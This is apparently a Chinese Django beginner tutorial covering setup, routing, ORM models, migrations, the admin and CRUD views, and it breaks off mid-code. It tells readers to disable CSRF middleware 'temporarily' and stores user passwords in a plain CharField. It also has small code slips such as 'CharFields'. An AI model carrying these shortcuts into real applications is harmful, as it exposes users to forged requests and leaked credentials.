        <content type="html"><![CDATA[<h2 id="安装与运行"><a href="#安装与运行" class="headerlink" title="安装与运行"></a>安装与运行</h2><h3 id="安装Django"><a href="#安装Django" class="headerlink" title="安装Django"></a>安装Django</h3><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> django</code></pre><p>可以执行以下命令检查Django是否安装完成，并查看安装版本</p><pre class=" language-bash"><code class="language-bash">python -m django --version</code></pre><h3 id="创建Django项目"><a href="#创建Django项目" class="headerlink" title="创建Django项目"></a>创建Django项目</h3><p>新建一个文件夹作为项目的目录，然后进入到该目录中，执行以下命令创建Django项目目录</p><pre class=" language-bash"><code class="language-bash">django-admin startproject 项目名称</code></pre><p>使用pycharm打开的项目结构如下图所示：</p><p><img src="https://img.imgdb.cn/item/603f22b5360785be54aae5e6.png" alt=""></p><h4 id="项目结构梳理"><a href="#项目结构梳理" class="headerlink" title="项目结构梳理"></a>项目结构梳理</h4><ul><li><p><strong>manage.py</strong>  是一个工具脚本，用作项目管理的，可以使用它执行管理操作</p></li><li><p><strong>login</strong> 是python包的目录，里面包含项目的重要配置文件，这个目录名字不能随便改，因为manage.py要用到它</p></li><li><p><strong>login/settings.py</strong> 是Django项目的配置文件</p></li><li><p><strong>login/urls.py</strong> 里面存放了一张表，声明了前端发过来的各种http请求，分别由哪些函数处理</p></li><li><p><strong>login/wsgi.py</strong> 提供给<font color=orange>wsgi web server</font>调用的接口文件，里面的<font color=orange>application</font>对应对象实现了wsgi入口，供<font color=orange>wsgi web server</font>调用 。</p></li></ul><h4 id="wsgi"><a href="#wsgi" class="headerlink" title="wsgi"></a>wsgi</h4><p>Python组织制定了Web服务网关接口(Web Server Gateway Interface)规范，简称wsgi。遵循wsgi规范的Web后端系统，我们可以理解成由两个部分组成，<font color=orange >wsgi web server</font> 和 <font color=orange>wsgi web application</font>，它们通常是运行在一个python进程中的两个模块(子系统)。</p><ul><li><p><strong>wsgi web server</strong> 接收到后端的http 请求后，会调用wsgi web application的接口方法，由 <strong>wsgi web application</strong> 具体处理该请求。然后把处理结果返回给<strong>wsgi web server</strong> ，<strong>wsgi web server</strong>再返回给前端</p><p><img src="https://img.imgdb.cn/item/603f27ea360785be54ad3a5a.png" alt=""></p></li></ul><h5 id="需要有两个子系统的原因"><a href="#需要有两个子系统的原因" class="headerlink" title="需要有两个子系统的原因"></a>需要有两个子系统的原因</h5><ul><li><p><font color=orange>wsgi web server</font> 负责 <strong>提供高效的http请求处理环境</strong> ，可以使用多线程、多进程或协程的机制。 http 请求发送到<font color=orange>wsgi web server</font> ，<font color=orange>wsgi web server</font> 分配线程或进程或协程，然后在这些线程、进程或协程去调用执行<font color=orange>wsgi web application</font>的入口代码。</p></li><li><p><font color=orange>wsgi web application</font> 被调用后，负责<strong>处理业务逻辑</strong>。 <font color=orange>django</font> 是<font color=orange>wsgi web application</font> 的框架，它只有一个简单的单线程 <font color=orange>wsgi web server</font>，供调试时使用。</p></li></ul><h3 id="运行Djano-Web服务"><a href="#运行Djano-Web服务" class="headerlink" title="运行Djano Web服务"></a>运行Djano Web服务</h3><p>​    Django虽然只是<font color=orange>wsgi web application</font> 的框架，但是它也有一个简单的<font color=orange> wsgi web server</font>供调试使用，所以也构成一个完成的后端Web服务，本地调试代码的时候，完全可以运行起来。进入到项目根目录，在这里是 login目录里，执行以下命令</p><pre class=" language-bash"><code class="language-bash">python manage.py runserver 0.0.0.0:端口号 --noreload</code></pre><blockquote><p>端口号不能被其他应用占用，否则会出现“以一种访问权限不允许的方式做了一个访问套接字的尝试。”的错误 </p><p><font color=orange>–noreload</font> 可以显示print语句，可用于调试，但每改变一次代码就需重新运行命令</p></blockquote><p>这样服务就会被启动，我们就可以在浏览器访问Web服务了。其中<font color=orange>0.0.0.0</font> 是指Web服务绑定的IP地址和端口。<font color=orange>0.0.0.0</font> 表示绑定本机所有的IP地址，就是可以通过任何一个本机的IP(包括环回地址 127.0.0.1)都可以访问此服务。</p><p>启动后通过浏览器访问以上网址可得到以下页面:</p><p><img src="https://img.imgdb.cn/item/603f308b360785be54b1840b.png" alt=""></p><p>访问本机IP地址出现以下页面，需要将login/settings中的ALLOWED_HOSTS</p><p><img src="https://img.imgdb.cn/item/603f3256360785be54b27ec1.png" alt=""></p><pre class=" language-python"><code class="language-python">ALLOWED_HOSTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'本机IP'</span><span class="token punctuation">]</span>ALLOWED_HOSTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'192.168.88.102'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">]</span></code></pre><h2 id="创建项目app"><a href="#创建项目app" class="headerlink" title="创建项目app"></a>创建项目app</h2><p>Django中的一个app就是项目里面的一个应用。一个项目包含多个app，一个app通常就是一个相对独立的模块，实现相对独立的功能。比如，我们可以把管理员执行的操作放在一个app里，普通用户放在一个app里。</p><p>一个app本质上就是一个Python包，里面包含了一些应用相关的代码文件。</p><p>Django中创建app 可以通过执行命令，创建一个app目录，并在里面自动创建app常用的文件，我们进入根目录，执行以下命令就可新建一个app项目</p><pre class=" language-bash"><code class="language-bash">python manage.py startapp manager</code></pre><blockquote><p><font color=orange>manager</font> 是app名，可自定义</p></blockquote><p>这样就会创建一个目录名为manager ， 对应一个名为manager的app，里面 包含如下自动生成的文件：</p><p><img src="https://img.imgdb.cn/item/603f372f360785be54b568bb.png" alt=""></p><p>###　返回页面内容给浏览器</p><p>服务器让浏览器呈现出网页内容：当我们输入网址后，浏览器会发送httpi请求给网址域名所在的服务器，此服务器返回HTML文档内容给浏览器，浏览器解析后，呈现出我们最终看到的网页内容。服务器返回的HTML文档内容其实就是符合HTML语法 的 <strong>一段字符串</strong>。</p><p>我们在上面创建的 <font color=orange >manager/views.py</font> 文件，这个文件通常是写处理http请求的代码的。比如我们设计凡是浏览器访问的http请求的url地址是<font color=orange>/api/manager/names</font>,就由 <font color=orange>view.py</font> 里面的函数 <font color=orange>listnames</font> 来处理，返回一段字符串给浏览器</p><h4 id="1-构造处理函数"><a href="#1-构造处理函数" class="headerlink" title="1. 构造处理函数"></a>1. 构造处理函数</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>http <span class="token keyword">import</span> HttpResponse<span class="token keyword">def</span> <span class="token function">listnames</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span><span class="token string">"下面是系统中所有用户的信息"</span><span class="token punctuation">)</span></code></pre><ul><li>这里最终返回结果是 <font color=orange>HttpResponse</font> 对象的参数字符串，也就是 <font color=orange>HttpResponse()</font> 中字符串的内容</li><li>listnames的参数request是Django中的 <font color=orange>HttpQuest</font> 对象，包含了请求中的信息。</li></ul><h4 id="2-设置路由"><a href="#2-设置路由" class="headerlink" title="2.设置路由"></a>2.设置路由</h4><h5 id="由urls-py一个文件控制"><a href="#由urls-py一个文件控制" class="headerlink" title="由urls.py一个文件控制"></a>由urls.py一个文件控制</h5><p>所有路由访问都只由<font color=orange>urls.py</font> 控制</p><p>打开  <font color=orange>login/urls.py</font> ，添加路由信息</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> manager<span class="token punctuation">.</span>views <span class="token keyword">import</span> listnamesurlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>    path<span class="token punctuation">(</span><span class="token string">'manager/names/'</span><span class="token punctuation">,</span>listnames<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span></code></pre><h5 id="分类控制-推荐使用"><a href="#分类控制-推荐使用" class="headerlink" title="分类控制(推荐使用)"></a>分类控制(推荐使用)</h5><p>访问 <font color=orange>manager/names</font>, <font color=orange>manager/names2</font> 等的Http请求由manager文件夹下的一个文件统一进行路由控制，新建一个<font color=orange>manager/urls.py</font> 文件。进行以下操作：</p><p><strong>login/urls.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path<span class="token punctuation">,</span>includeurlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>    path<span class="token punctuation">(</span><span class="token string">'manager/'</span><span class="token punctuation">,</span>include<span class="token punctuation">(</span><span class="token string">"manager.urls"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#凡是以manager开头的url都去使用manager.urls文件中的路由表</span><span class="token punctuation">]</span></code></pre><p><strong>manager/urls.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path<span class="token keyword">from</span> manager<span class="token punctuation">.</span>views <span class="token keyword">import</span> listnames1<span class="token punctuation">,</span>listnames2urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>    path<span class="token punctuation">(</span><span class="token string">'names1/'</span><span class="token punctuation">,</span>listnames1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#访问api/manager/names1的请求由listnames1函数处理 </span>    path<span class="token punctuation">(</span><span class="token string">'names2/'</span><span class="token punctuation">,</span>listnames2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span></code></pre><p><strong>manager/views.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>http <span class="token keyword">import</span> HttpResponse<span class="token keyword">def</span> <span class="token function">listnames1</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span><span class="token string">"下面是系统中所有用户的信息1"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">listnames2</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span><span class="token string">"下面是系统中所有用户的信息2"</span><span class="token punctuation">)</span></code></pre><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><h3 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h3><p><font color=orange>sqlite</font> 没有独立的数据库服务进程，数据操作被做成库直接供引用程序调用。Django 中可以直接使用，无须先搭建数据服务。</p><h3 id="创建数据库-1"><a href="#创建数据库-1" class="headerlink" title="创建数据库"></a>创建数据库</h3><p><font color=orange>Django</font> 中数据库的配置在<font color=orange>login/settings.py</font> 中：</p><pre class=" language-python"><code class="language-python">DATABASES <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'default'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">'ENGINE'</span><span class="token punctuation">:</span> <span class="token string">'django.db.backends.sqlite3'</span><span class="token punctuation">,</span>        <span class="token string">'NAME'</span><span class="token punctuation">:</span> BASE_DIR <span class="token operator">/</span> <span class="token string">'db.sqlite3'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们使用命令创建的项目，缺省就是使用sqlite，对于数据库文件，缺省的文件名是 <font color=orange>db.splite3</font> 位于项目的根目录之下，执行以下命令，就会在项目的根目录下生成一个配置文件中指定的数据库文件<font color=orange>db.splite3</font>:</p><pre><code>python manage.py migrate</code></pre><blockquote><p>sqlitestudio是sqlite的可视化工具，下载后解压并运行，打开上述db.splite3文件就查看数据库当前的表有哪些</p></blockquote><p><img src="https://img.imgdb.cn/item/6041cbae360785be54d9197b.png" alt=""></p><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p><font color=orange>Django</font> 里，数据库的操作，包括数据的增删改查，基本都是通过 <font color=orange>Model</font> 类型的对象进行的。通常，在Django中：</p><ul><li>定义一张数据表，就是定义一个继承自 <font color=orange>django.db.models.Model</font>  的类</li><li>定义该表中的字段(列)，就是定义该类中的一些属性</li><li>类的方法就是对该表中数据的处理方法，包括数据的增删改查</li></ul><p>这样，对数据库的访问，就从原来的使用底层sql语句，变成面向对象的开发，通过一系列对象的类定义和方法调用就可以操作数据库，这样做的优点是：</p><ul><li>提高开发效率</li><li>屏蔽了不同的数据库访问的底层细节，基本做到开发好代码后，如果要换数据库，几乎不需要改代码，修改几个配置项就行</li></ul><p><strong>这种通过对象操作数据库的方法被称之为ORM(Object Relational Mapping)</strong></p><h3 id="定义我们的数据库表"><a href="#定义我们的数据库表" class="headerlink" title="定义我们的数据库表"></a>定义我们的数据库表</h3><p>首先，我们创建一个名为common的app目录，里面存放我们项目需要的一些公共的表的定义。进入根目录执行以下命令，创建common app项目</p><pre class=" language-bash"><code class="language-bash">python manage.py startapp common</code></pre><p><font color=orange>Django</font> 是通过定义类来定义数据库表的，我们要定义数据库的表，只需在app目录下定义特殊的类就可以了。一般来说，数据库表的定义是放在app目录下的<font color=orange>models.py</font> 里。在<font color=orange>models.py</font> 中加入以下内容：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#用户名</span>    name <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户密码</span>    password <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span></code></pre><p>这个User类继承自<font color=orange>django.db.models.Model</font> ，用来定义数据库表，其中的<font color=orange>name,password</font> 是自定义的三个字段。</p><p>定义表中的字段就是定义一些静态属性，这些属性是<font color=orange>django.db.models</font> 里面的各种Field对象，对应不同类型的字段。Django有很多字段对象类型，对应不同的类型的数据库字段。(可参考Django官方文档)</p><h3 id="创建数据库表"><a href="#创建数据库表" class="headerlink" title="创建数据库表"></a>创建数据库表</h3><p>定义好数据库表后，我们要告诉Django需要关注我们的common应用，因为其中包含了数据库<font color=orange>Model</font> 的定义，在项目的配置文件<font color=orange>login/settings.py</font> 中，<font color=orange>INSTALLED_APPS</font> 配置项加入以下内容：</p><pre class=" language-python"><code class="language-python">INSTALLED_APPS <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'django.contrib.admin'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.auth'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.contenttypes'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.sessions'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.messages'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.staticfiles'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#common</span>    <span class="token string">'common.apps.CommonConfig'</span><span class="token punctuation">,</span><span class="token punctuation">]</span></code></pre><p><font color=orange>common.apps.CommonConfig</font> 告诉Django, <font color=orange>CommonConfig</font> 是 <font color=orange>common/apps.py</font> 文件中定义的一个应用配置类：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>apps <span class="token keyword">import</span> AppConfig<span class="token keyword">class</span> <span class="token class-name">CommonConfig</span><span class="token punctuation">(</span>AppConfig<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'common'</span> <span class="token comment" spellcheck="true">#定义应用的python模块路径</span></code></pre><h4 id="修改数据库表"><a href="#修改数据库表" class="headerlink" title="修改数据库表"></a>修改数据库表</h4><p>现在Django知道了我们的common应用，我们可以在项目根目录下执行命令:</p><pre><code>python manage.py makemigrations common</code></pre><p><img src="https://img.imgdb.cn/item/6041d762360785be54e41dcc.png" alt=""></p><p>上述操作只是产生了一个修改的代码文件，要把修改真正提交到数据库，需要继续执行下列命令:</p><pre><code>python manage.py migrate</code></pre><p>点击刷新后，数据库中出现common_user的表:</p><p><img src="https://img.imgdb.cn/item/6041d860360785be54e49469.png" alt=""></p><p>如果需要在该表中添加新的字段，需要在<font color=orange>common/models.py</font> 中加入以下内容：</p><pre class=" language-python"><code class="language-python">qq <span class="token operator">=</span> models<span class="token punctuation">.</span>CharFields<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>null<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><blockquote><p>null参数表示可以为空，blank表示可以接收空字符串</p></blockquote><p>再执行上述两条命令。</p><p>对auth_user表进行操作的方法参考(<a href="https://blog.csdn.net/qq_31455841/article/details/109295785" target="_blank" rel="noopener">https://blog.csdn.net/qq_31455841/article/details/109295785</a>)</p><h5 id="修改auth-user表"><a href="#修改auth-user表" class="headerlink" title="修改auth_user表"></a>修改auth_user表</h5><p><strong>修改auth_user表要确保删除所有原始数据库信息(删除db.sqlite3以及所有migrations文件夹的文件)，或者再未对数据库进行初始化之前就修改</strong></p><p>新建一个app项目，在该app项目的models.py写下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#重新定义auth_user表</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models<span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>auth<span class="token punctuation">.</span>models <span class="token keyword">import</span> AbstractUser<span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span>AbstractUser<span class="token punctuation">)</span><span class="token punctuation">:</span>    user_key <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>blank<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#在原本auth_user表的基础上增加一个user_key字段</span></code></pre><p><strong>settings.py</strong></p><pre class=" language-python"><code class="language-python">INSTALLED_APPS <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'django.contrib.admin'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.auth'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.contenttypes'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.sessions'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.messages'</span><span class="token punctuation">,</span>    <span class="token string">'django.contrib.staticfiles'</span><span class="token punctuation">,</span>    <span class="token string">'common.apps.CommonConfig'</span>   <span class="token comment" spellcheck="true">#注册</span><span class="token punctuation">]</span>AUTH_USER_MODEL<span class="token operator">=</span><span class="token string">"common.UserInfo"</span>  <span class="token comment" spellcheck="true">#app项目名.类名,auth_user表指定使用该模型</span></code></pre><p>最后执行以下命令：</p><pre><code>python manage.py makemigrations commonpython manage.py migrate</code></pre><h2 id="Django-Admin-管理数据"><a href="#Django-Admin-管理数据" class="headerlink" title="Django Admin 管理数据"></a>Django Admin 管理数据</h2><h3 id="创建超级管理员"><a href="#创建超级管理员" class="headerlink" title="创建超级管理员"></a>创建超级管理员</h3><p>Django提供了一个管理员操作界面可以方便的添加、修改、删除你定义的model表的数据。首先，我们需要创建一个超级管理员账号。进入到项目根目录，执行如下命令，依次输入要创建的超级管理员的登录名、email、密码。</p><pre><code>python manage.py createsuperuser  #密码至少需要八个字符</code></pre><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改应用里面的管理员配置文件 <font color=orange>common/admin.py</font> ，注册我们定义的model类，这样Django才会知道我们创建的User数据表:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin<span class="token keyword">from</span> <span class="token punctuation">.</span>models <span class="token keyword">import</span> Useradmin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>User<span class="token punctuation">)</span></code></pre><p>然后<strong>重新启动项目</strong>访问http://服务器IP端口/admin,输入刚才注册的超级管理员的用户名和密码，就可对项目的数据库进行可视化操作</p><h2 id="读取数据库数据"><a href="#读取数据库数据" class="headerlink" title="读取数据库数据"></a>读取数据库数据</h2><h3 id="获取全部数据"><a href="#获取全部数据" class="headerlink" title="获取全部数据"></a>获取全部数据</h3><p>现在我们来实现一个功能：浏览器访问<font color=orange>manager/users/</font>  我们的服务器就返回系统中所有的客户记录给浏览器。通过上面的学习，我们直接对处理http请求的函数进行处理:</p><p><strong>manager/views.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>shortcuts <span class="token keyword">import</span> render<span class="token comment" spellcheck="true"># Create your views here.</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>http <span class="token keyword">import</span> HttpResponse<span class="token keyword">from</span> common<span class="token punctuation">.</span>models <span class="token keyword">import</span> User  <span class="token comment" spellcheck="true">#引用数据表User对象</span><span class="token keyword">def</span> <span class="token function">listUsers</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    qs <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#obejcts对应数据库操作,value()方法返回一个QuerySet对象，由Django定义，包含所有的Use表的记录</span>    resStr <span class="token operator">=</span> <span class="token string">''</span> <span class="token comment" spellcheck="true">#定义返回字符串</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> qs<span class="token punctuation">:</span>        <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> user<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            resStr <span class="token operator">+=</span> f<span class="token string">'{key}:{value} '</span>        resStr <span class="token operator">+=</span> <span class="token string">'&lt;br>'</span>  <span class="token comment" spellcheck="true">#换行</span>    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span>resStr<span class="token punctuation">)</span></code></pre><p>修改 <font color=orange>manager/urls.py</font> 文件即可</p><h3 id="过滤条件"><a href="#过滤条件" class="headerlink" title="过滤条件"></a>过滤条件</h3><p>有时我们需要根据过滤条件查询部分客户信息，比如用户输入 <font color=orange >/manager/users/?name=11673</font> 要求返回用户名为11673的用户记录。此时需要通过 <font color=orange >filter</font> 方法加入过滤条件，修改<font color=orange>manager/views.py</font> 文件如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>shortcuts <span class="token keyword">import</span> render<span class="token comment" spellcheck="true"># Create your views here.</span><span class="token keyword">from</span> django<span class="token punctuation">.</span>http <span class="token keyword">import</span> HttpResponse<span class="token keyword">from</span> common<span class="token punctuation">.</span>models <span class="token keyword">import</span> User  <span class="token comment" spellcheck="true">#引用数据表User对象</span><span class="token keyword">def</span> <span class="token function">listUsers</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    qs <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#返回一个QuerySet对象，由Django定义，包含所有的Use表的记录</span>    resStr <span class="token operator">=</span> <span class="token string">''</span> <span class="token comment" spellcheck="true">#定义返回字符串</span>    nameFilter <span class="token operator">=</span> request<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span>None<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#检查url中是否有参数name</span>    <span class="token keyword">if</span> nameFilter<span class="token punctuation">:</span>        qs <span class="token operator">=</span> qs<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>name<span class="token operator">=</span>nameFilter<span class="token punctuation">)</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> qs<span class="token punctuation">:</span>        <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> user<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            resStr <span class="token operator">+=</span> f<span class="token string">'{key}:{value} '</span>        resStr <span class="token operator">+=</span> <span class="token string">'&lt;br>'</span>  <span class="token comment" spellcheck="true">#换行</span>    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span>resStr<span class="token punctuation">)</span></code></pre><h2 id="对资源的增删改查处理"><a href="#对资源的增删改查处理" class="headerlink" title="对资源的增删改查处理"></a>对资源的增删改查处理</h2><p>采用前后端分离的架构开发，后端不负责任何展现界面工作，而是负责对数据进行管理。<strong>数据管理</strong>，主要就是响应前端请求，对数据资源的增删改查。<strong>此处的增删改查是基于我们自己创建的数据库表，不适用于auth_user数据库表，即此部分实现的内容为管理员对自定义数据库表进行增删改查操作</strong></p><p><strong>Django的url路由功能不支持直接根据HTTP请求的方法和请求体里面的参数进行路由。</strong></p><blockquote><p>在此项目中，增删改查为管理员权限，所以都在manager 项目app文件夹中进行操作</p></blockquote><h3 id="临时取消CSRF校验"><a href="#临时取消CSRF校验" class="headerlink" title="临时取消CSRF校验"></a>临时取消CSRF校验</h3><p>Django缺省创建的项目，会启用一个<font color=orange>CSRF(跨站请求伪造)</font> 安全防护机制.</p><p>在这种情况下，所有的POST、PUT类型的请求都必须在HTTP请求中携带用于校验的数据。</p><p>为了简单起见，我们先临时取消掉CSRF的校验机制，等以后有需要再打开。</p><p>取消校验机制，只需注释掉 <font color=orange>login/settings.py</font> 中的 <font color=orange>MIDDLEWARE</font> 配置项的：</p><pre class=" language-python"><code class="language-python"><span class="token string">'django.middleware.csrf.CsrfViewMiddleware'</span><span class="token punctuation">,</span></code></pre><h3 id="自己编写dispatcher函数"><a href="#自己编写dispatcher函数" class="headerlink" title="自己编写dispatcher函数"></a>自己编写dispatcher函数</h3><p>鉴于Django的上述特性，我们可以自己编写一个函数，来根据http请求的类型和请求体里面的参数分发(或者说路由)给不同的函数进行处理。</p><p><strong>manager/action.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">dispatcher</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    json <span class="token operator">=</span> checkout<span class="token punctuation">.</span>checkToken<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 验证token合法性</span>    <span class="token comment" spellcheck="true"># 根据token判断用户是否为登录的管理员</span>    <span class="token keyword">if</span> json<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        userInfo <span class="token operator">=</span> json<span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># token信息</span>        userId <span class="token operator">=</span> userInfo<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>id<span class="token operator">=</span>userId<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取信息</span>        <span class="token keyword">if</span> user<span class="token punctuation">.</span>is_superuser<span class="token punctuation">:</span>            bodys <span class="token operator">=</span> str<span class="token punctuation">(</span>request<span class="token punctuation">.</span>body<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取request请求体</span>            bodys <span class="token operator">=</span> bodys<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span>            body <span class="token operator">=</span> bodys<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 将list转为json</span>            keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> item <span class="token keyword">in</span> body<span class="token punctuation">:</span>                item <span class="token operator">=</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>                keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                values<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            bodyJson <span class="token operator">=</span> dict<span class="token punctuation">(</span>zip<span class="token punctuation">(</span>keys<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'action'</span> <span class="token keyword">in</span> keys<span class="token punctuation">:</span>                action <span class="token operator">=</span> bodyJson<span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span>                <span class="token keyword">if</span> action <span class="token operator">==</span> <span class="token string">'list_customer'</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> listCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 处理函数</span>                <span class="token keyword">elif</span> action <span class="token operator">==</span> <span class="token string">'add_customer'</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> addCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>                <span class="token keyword">elif</span> action <span class="token 